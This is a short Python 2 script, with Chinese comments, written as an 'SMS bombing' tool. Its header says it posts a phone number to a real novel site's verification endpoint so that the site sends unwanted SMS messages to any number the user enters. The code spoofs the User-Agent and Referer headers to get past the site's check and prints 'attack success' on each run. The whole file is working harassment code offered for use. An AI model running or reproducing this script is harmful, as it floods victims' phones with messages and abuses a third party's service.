# -*- coding: utf-8 -*-
#-------------------------------------
#   python2.7
#   author:loster
#   version:0.1
#   description:向http://www.hongxiu.com/网站post数据，给任意手机号码发送验证短信，进行短信轰炸
#                但是每天对同一手机号有条数限制
#---------------------------------

import httplib,urllib,sys,os,re,urllib2
import string

def attack(phone):
    datas=""
    
    url='http://topic.hongxiu.com/wap/action.aspx'
    #请求的数据
    payload={'hidtpye':'1',
        'txtMobile':phone}
    #注意Referer不能为空
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
                  "Accept": "text/plain",'Referer':'http://topic.hongxiu.com/wap/'} 
    payload=urllib.urlencode(payload)
   
    try:
        request=urllib2.Request(url,payload,i_headers)
        response=urllib2.urlopen(request)
        datas=response.read()
        print datas
        print 'attack success!!!'
    except Exception, e:
        print e
        print "attack failed!!!" 
 
if __name__=="__main__":
    phone=raw_input('input the phone:')
    attack(phone)
    
